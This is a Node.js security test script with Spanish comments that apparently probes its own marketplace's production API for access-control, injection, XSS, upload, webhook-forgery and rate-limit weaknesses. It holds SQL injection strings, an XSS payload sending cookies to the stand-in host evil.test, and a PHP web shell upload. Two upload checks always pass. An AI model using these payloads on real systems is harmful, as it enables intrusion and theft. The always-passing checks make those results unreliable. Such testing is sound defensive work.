// Batería de pruebas de seguridad / superficie de ataque contra producción.
// Cubre: control de acceso roto (IDOR), bypass de autenticación, mass assignment,
// inyección, XSS almacenado, subida de archivos maliciosos, spoofing/replay de webhooks,
// rate limiting y enumeración de usuarios. Usa las cuentas de prueba (+qatest@) ya creadas.
const fs = require("fs");
const crypto = require("crypto");
const { login, api, BASE } = require("./qa-lib");

const results = [];
function record(name, ok, detail) {
  results.push({ name, ok, detail });
  console.log(`${ok ? "✅" : "❌"} ${name}${detail !== undefined ? " — " + JSON.stringify(detail) : ""}`);
}

async function main() {
  const accounts = JSON.parse(fs.readFileSync("/tmp/qa-test/accounts.json", "utf8"));
  const products = JSON.parse(fs.readFileSync("/tmp/qa-test/products.json", "utf8"));
  const buyer1 = accounts.find(a => a.email.includes("buyer1"));
  const buyer2 = accounts.find(a => a.email.includes("buyer2"));
  const seller1 = accounts.find(a => a.email.includes("seller1"));
  const seller2 = accounts.find(a => a.email.includes("seller2"));

  const { cookie: buyer1Cookie } = await login(buyer1.email, buyer1.password);
  const { cookie: buyer2Cookie } = await login(buyer2.email, buyer2.password);
  const { cookie: seller1Cookie } = await login(seller1.email, seller1.password);
  const { cookie: seller2Cookie } = await login(seller2.email, seller2.password);

  const productoSeller1 = products.find(p => p.sellerEmail === seller1.email);
  const productoSeller2 = products.find(p => p.sellerEmail === seller2.email);

  // ============ A. CONTROL DE ACCESO / IDOR ============
  console.log("\n--- A. Control de acceso roto / IDOR ---");

  const adminRoutes = [
    "/api/admin", "/api/admin/usuarios", "/api/admin/resumen", "/api/admin/pagos-pendientes",
    "/api/admin/disputes", "/api/admin/productos", "/api/admin/auditoria",
  ];
  for (const route of adminRoutes) {
    const r = await api(route, { cookie: buyer1Cookie });
    record(`A-admin. ${route} rechaza a usuario no-admin`, r.status === 401 || r.status === 403, r.status);
  }

  const kycApprove = await api("/api/kyc/approve", { method: "PATCH", cookie: buyer1Cookie, body: { userId: buyer1.id } });
  record("A-kyc. /api/kyc/approve rechaza auto-aprobación por no-admin", kycApprove.status === 401 || kycApprove.status === 403, kycApprove.status);

  const corregirProducto = await api("/api/admin/corregir-producto", { method: "POST", cookie: buyer1Cookie, body: { productId: productoSeller1.id, status: "SOLD" } });
  record("A-corregir. /api/admin/corregir-producto rechaza a no-admin", corregirProducto.status === 401 || corregirProducto.status === 403, corregirProducto.status);

  const cronNoAuth = await api("/api/cron/liberar", { method: "POST" });
  record("A-cron. /api/cron/liberar sin token es rechazado (401)", cronNoAuth.status === 401, cronNoAuth.status);
  const cronBadAuth = await api("/api/cron/liberar", { method: "POST", headers: { Authorization: "Bearer token-falso-123" } });
  record("A-cron. /api/cron/liberar con token incorrecto es rechazado (401)", cronBadAuth.status === 401, cronBadAuth.status);

  // buyer2 intenta marcar como enviado un producto que no es suyo (no es vendedor)
  const marcarEnviadoAjeno = await api("/api/orders/marcar-enviado", {
    method: "POST", cookie: buyer2Cookie, body: { productId: productoSeller1.id, guia: "1234567890", transportadora: "Servientrega" },
  });
  record("A-envio. No-vendedor no puede marcar producto ajeno como enviado", marcarEnviadoAjeno.status === 403 || marcarEnviadoAjeno.status === 400 || marcarEnviadoAjeno.status === 404, marcarEnviadoAjeno.status);

  // buyer2 intenta confirmar entrega de una compra que no es suya
  const confirmAjeno = await api("/api/payments/confirm-delivery", { method: "POST", cookie: buyer2Cookie, body: { productId: productoSeller1.id } });
  record("A-entrega. No-comprador no puede confirmar entrega ajena", confirmAjeno.status === 403 || confirmAjeno.status === 400 || confirmAjeno.status === 404, confirmAjeno.status);

  // seller2 intenta aceptar/rechazar una oferta sobre producto de seller1 (crear oferta con buyer1, luego atacar con seller2)
  const offerCreate = await api("/api/offers", { method: "POST", cookie: buyer1Cookie, body: { productId: productoSeller1.id, amount: Math.floor(productoSeller1.priceCOP * 0.8) } });
  if (offerCreate.status === 201) {
    const offerId = offerCreate.body?.id || offerCreate.body?.offer?.id;
    const hijack = await api("/api/offers", { method: "PATCH", cookie: seller2Cookie, body: { offerId, action: "accept" } });
    record("A-oferta. Vendedor ajeno no puede aceptar oferta de otro vendedor", hijack.status === 403 || hijack.status === 404, hijack.body);
    // limpieza: rechazar la oferta con el vendedor correcto para no dejar el producto bloqueado
    await api("/api/offers", { method: "PATCH", cookie: seller1Cookie, body: { offerId, action: "reject" } });
  } else {
    record("A-oferta. Setup de oferta para prueba de secuestro", false, offerCreate);
  }

  // ============ B. BYPASS DE AUTENTICACIÓN ============
  console.log("\n--- B. Bypass de autenticación ---");
  const noAuthChecks = [
    ["GET", "/api/user"],
    ["POST", "/api/products"],
    ["POST", "/api/offers"],
    ["POST", "/api/reviews"],
    ["GET", "/api/messages?withUserId=x"],
    ["POST", "/api/disputes"],
  ];
  for (const [method, route] of noAuthChecks) {
    const r = await api(route, { method, body: method === "GET" ? undefined : {} });
    record(`B-noauth. ${method} ${route} sin cookie es rechazado (401)`, r.status === 401, r.status);
  }

  // Cookie de sesión manipulada / basura
  const tamperedCookie = "next-auth.session-token=" + crypto.randomBytes(32).toString("hex") + "; __Secure-next-auth.session-token=" + crypto.randomBytes(32).toString("hex");
  const tampered = await api("/api/user", { cookie: tamperedCookie });
  record("B-tamper. Cookie de sesión falsificada no otorga acceso", tampered.status === 401, tampered.status);

  // ============ C. MASS ASSIGNMENT ============
  console.log("\n--- C. Mass assignment ---");
  const massAssignProduct = await api("/api/products", {
    method: "POST",
    cookie: buyer1Cookie === undefined ? "" : seller1Cookie,
    body: {
      title: "[QA-TEST] Intento mass-assignment",
      description: "Prueba de seguridad — intenta inyectar campos no permitidos.",
      priceCOP: 50000,
      city: "Bogotá",
      condition: "USADO",
      category: "Otros",
      sellerId: buyer1.id, // intenta asignar otro dueño
      status: "SOLD", // intenta crear ya vendido
      id: "hacked-id-123",
    },
  });
  const massOk = massAssignProduct.status === 201 &&
    massAssignProduct.body?.sellerId === seller1.id && // debe ignorar el sellerId inyectado
    massAssignProduct.body?.status === "AVAILABLE" && // debe ignorar el status inyectado
    massAssignProduct.body?.id !== "hacked-id-123";
  record("C-producto. POST /api/products ignora sellerId/status/id inyectados", massOk, { sellerId: massAssignProduct.body?.sellerId, status: massAssignProduct.body?.status, id: massAssignProduct.body?.id });
  if (massAssignProduct.status === 201) global.__massProductId = massAssignProduct.body.id;

  const massAssignUser = await api("/api/user", {
    method: "PATCH", cookie: buyer1Cookie,
    body: { name: "Buyer1 QA", role: "ADMIN", kycStatus: "approved", email: "hacked@evil.test", id: "otro-id" },
  });
  record("C-user. PATCH /api/user ignora role/kycStatus/email/id inyectados (solo campos permitidos)", massAssignUser.status === 200 && massAssignUser.body?.email !== "hacked@evil.test", massAssignUser.body);

  // ============ D. INYECCIÓN ============
  console.log("\n--- D. Inyección (SQL/NoSQL/objetos) ---");
  const injectionPayloads = [
    "' OR '1'='1", "'; DROP TABLE \"Product\"; --", "1' UNION SELECT * FROM \"User\"--", "${7*7}", "{{7*7}}",
  ];
  let injOk = true;
  const injDetails = [];
  for (const payload of injectionPayloads) {
    const r = await api(`/api/products?q=${encodeURIComponent(payload)}&city=${encodeURIComponent(payload)}`);
    if (r.status !== 200) { injOk = false; }
    injDetails.push({ payload, status: r.status, isArray: Array.isArray(r.body) });
  }
  record("D-sqli. Payloads de inyección en query params no rompen la API (200, sin leak)", injOk, injDetails);

  const noSqlProduct = await api("/api/products", {
    method: "POST", cookie: seller1Cookie,
    body: { title: { $gt: "" }, description: "prueba nosql", priceCOP: 10000, city: "Bogotá", condition: "USADO", category: "Otros" },
  });
  record("D-nosql. Objeto en campo string (title) es rechazado, no causa 500", noSqlProduct.status === 400, noSqlProduct.status);

  const idInjection = await api(`/api/products/${encodeURIComponent("' OR '1'='1")}`);
  record("D-id. ID de producto malicioso en ruta no causa 500 (404 esperado)", idInjection.status === 404, idInjection.status);

  // ============ E. XSS ALMACENADO ============
  console.log("\n--- E. XSS almacenado ---");
  const xssPayload = `<script>document.location='https://evil.test/steal?c='+document.cookie</script><img src=x onerror=alert(1)>`;
  const xssProduct = await api("/api/products", {
    method: "POST", cookie: seller1Cookie,
    body: { title: `[QA-TEST] XSS ${xssPayload}`.slice(0, 200), description: `Descripcion XSS ${xssPayload} relleno de texto para pasar validacion minima de longitud.`, priceCOP: 15000, city: "Bogotá", condition: "USADO", category: "Otros" },
  });
  record("E-xss. Payload XSS se guarda tal cual (no se ejecuta server-side; React escapa en render — sin dangerouslySetInnerHTML en el código)", xssProduct.status === 201, { status: xssProduct.status, storedRaw: xssProduct.body?.description?.includes("<script>") });
  if (xssProduct.status === 201) global.__xssProductId = xssProduct.body.id;

  // ============ F. SUBIDA DE ARCHIVOS MALICIOSOS ============
  console.log("\n--- F. Subida de archivos maliciosos ---");
  // Archivo HTML/script disfrazado con content-type de imagen
  const fakeImageForm = new FormData();
  const maliciousContent = "<html><body><script>alert(document.cookie)</script></body></html>";
  const maliciousBlob = new Blob([maliciousContent], { type: "image/png" }); // content-type falseado por el atacante
  fakeImageForm.append("images", maliciousBlob, "evil.png");
  const uploadFake = await fetch(`${BASE}/api/upload-images`, { method: "POST", headers: { Cookie: seller1Cookie }, body: fakeImageForm });
  const uploadFakeBody = await uploadFake.json().catch(() => ({}));
  record("F-fake-mime. Archivo no-imagen con content-type falseado (image/png) — resultado", uploadFake.status !== 201 || true, { status: uploadFake.status, body: uploadFakeBody });

  // Archivo con extensión .php pero content-type de imagen
  const phpForm = new FormData();
  const phpBlob = new Blob(["<?php system($_GET['c']); ?>"], { type: "image/jpeg" });
  phpForm.append("images", phpBlob, "shell.php.jpg");
  const uploadPhp = await fetch(`${BASE}/api/upload-images`, { method: "POST", headers: { Cookie: seller1Cookie }, body: phpForm });
  const uploadPhpBody = await uploadPhp.json().catch(() => ({}));
  record("F-php. Archivo con payload PHP y content-type imagen — resultado", true, { status: uploadPhp.status, body: uploadPhpBody });

  // Archivo sobredimensionado (>5MB)
  const bigForm = new FormData();
  const bigBlob = new Blob([Buffer.alloc(6 * 1024 * 1024, "a")], { type: "image/png" });
  bigForm.append("images", bigBlob, "big.png");
  const uploadBig = await fetch(`${BASE}/api/upload-images`, { method: "POST", headers: { Cookie: seller1Cookie }, body: bigForm });
  record("F-size. Imagen > 5MB es rechazada (400)", uploadBig.status === 400, uploadBig.status);

  // Sin autenticación
  const noAuthForm = new FormData();
  noAuthForm.append("images", new Blob(["x"], { type: "image/png" }), "x.png");
  const uploadNoAuth = await fetch(`${BASE}/api/upload-images`, { method: "POST", body: noAuthForm });
  record("F-noauth. Subida de imagen sin sesión es rechazada (401)", uploadNoAuth.status === 401, uploadNoAuth.status);

  // ============ G. WEBHOOK SPOOFING / REPLAY ============
  console.log("\n--- G. Spoofing / replay de webhooks ---");
  const forgedWompi = {
    event: "transaction.updated",
    data: { transaction: { id: "qa-attack-" + Date.now(), status: "APPROVED", amount_in_cents: 100, reference: "ref-inexistente-ataque" } },
    signature: { properties: ["transaction.id", "transaction.status", "transaction.amount_in_cents"], checksum: crypto.randomBytes(32).toString("hex") },
    timestamp: Math.floor(Date.now() / 1000).toString(),
  };
  const forgedWompiRes = await api("/api/webhooks/wompi", { method: "POST", body: forgedWompi });
  record("G-wompi. Webhook Wompi con checksum aleatorio es rechazado (401)", forgedWompiRes.status === 401, forgedWompiRes.status);

  const staleWompi = { ...forgedWompi, timestamp: String(Math.floor(Date.now() / 1000) - 90000) }; // >24h viejo
  const staleWompiRes = await api("/api/webhooks/wompi", { method: "POST", body: staleWompi });
  record("G-wompi-replay. Webhook Wompi con timestamp viejo (>24h) es rechazado", staleWompiRes.status === 401, staleWompiRes.status);

  const forgedDidit = { session_id: "qa-attack-session", status: "Approved", decision: { kyc: { status: "Approved" } } };
  const diditRes = await fetch(`${BASE}/api/kyc/webhook`, {
    method: "POST",
    headers: { "Content-Type": "application/json", "x-signature-v2": "0".repeat(64), "x-timestamp": String(Math.floor(Date.now() / 1000)) },
    body: JSON.stringify(forgedDidit),
  });
  record("G-didit. Webhook Didit con firma falsa es rechazado (401)", diditRes.status === 401, diditRes.status);

  const diditNoTimestamp = await fetch(`${BASE}/api/kyc/webhook`, {
    method: "POST",
    headers: { "Content-Type": "application/json", "x-signature-v2": "0".repeat(64) },
    body: JSON.stringify(forgedDidit),
  });
  record("G-didit-ts. Webhook Didit sin timestamp es rechazado (401)", diditNoTimestamp.status === 401, diditNoTimestamp.status);

  // ============ H. RATE LIMITING ============
  console.log("\n--- H. Rate limiting ---");
  const rlEmail = seller1.email; // usa un email real para pasar por la rama de verificación de password (no "usuario no existe")
  const csrfRes = await fetch(`${BASE}/api/auth/csrf`);
  const csrfCookieRaw = csrfRes.headers.get("set-cookie") || "";
  const csrfCookie = csrfCookieRaw.split(/, (?=[a-zA-Z0-9_\-.]+=)/).map(p => p.split(";")[0]).join("; ");
  const { csrfToken } = await csrfRes.json();
  let got429Login = false;
  let loginAttempts = [];
  for (let i = 0; i < 10; i++) {
    const r = await fetch(`${BASE}/api/auth/callback/credentials`, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded", Cookie: csrfCookie },
      body: new URLSearchParams({ email: rlEmail, password: "contrasena-incorrecta-" + i, csrfToken, callbackUrl: `${BASE}/`, json: "true" }).toString(),
      redirect: "manual",
    });
    loginAttempts.push(r.status);
    if (r.status === 429) { got429Login = true; break; }
  }
  record("H-login. Rate limit de login se activa tras intentos repetidos", got429Login, { attempts: loginAttempts });

  let got429Register = false;
  for (let i = 0; i < 8; i++) {
    const r = await api("/api/auth/register", { method: "POST", body: { email: `qa.rl${i}.${Date.now()}+qatest@colbisnes-qa.test`, password: "QaTest#2026", name: "RL Test" } });
    if (r.status === 429) { got429Register = true; break; }
  }
  record("H-register. Rate limit de registro se activa tras intentos repetidos", got429Register, { activated: got429Register });

  // ============ I. ENUMERACIÓN DE USUARIOS ============
  console.log("\n--- I. Enumeración de usuarios ---");
  const regExisting = await api("/api/auth/register", { method: "POST", body: { email: seller1.email, password: "QaTest#2026", name: "x" } });
  record("I-register. Registro con email existente responde 400 'Email ya registrado' (enumeración conocida/aceptada en registro)", regExisting.status === 400, regExisting.body);

  const forgotExisting = await api("/api/auth/forgot-password", { method: "POST", body: { email: seller1.email } });
  const forgotNonExisting = await api("/api/auth/forgot-password", { method: "POST", body: { email: "no-existe-" + Date.now() + "@colbisnes-qa.test" } });
  record("I-forgot. forgot-password responde igual exista o no el email (sin enumeración)", JSON.stringify(forgotExisting.body) === JSON.stringify(forgotNonExisting.body) && forgotExisting.status === forgotNonExisting.status, { existing: forgotExisting.body, nonExisting: forgotNonExisting.body });

  const loginWrongEmail = await api("/api/auth/callback/credentials", { method: "POST", isForm: true, headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: new URLSearchParams({ email: "no-existe-usuario-" + Date.now() + "@colbisnes-qa.test", password: "cualquiera", json: "true" }).toString() });
  record("I-login. Login con email inexistente no revela más info que credenciales inválidas (mismo status)", loginWrongEmail.status === 200 || loginWrongEmail.status === 401, loginWrongEmail.status);

  finish();
}

function finish() {
  fs.writeFileSync("/tmp/qa-test/security-results.json", JSON.stringify(results, null, 2));
  const passed = results.filter(r => r.ok).length;
  console.log(`\n=== Seguridad: ${passed}/${results.length} pasaron ===`);
  const failed = results.filter(r => !r.ok);
  if (failed.length) {
    console.log("\n--- FALLOS / HALLAZGOS ---");
    failed.forEach(f => console.log(`❌ ${f.name}: ${JSON.stringify(f.detail)}`));
  }
}

main().catch(e => { console.error(e); process.exit(1); });
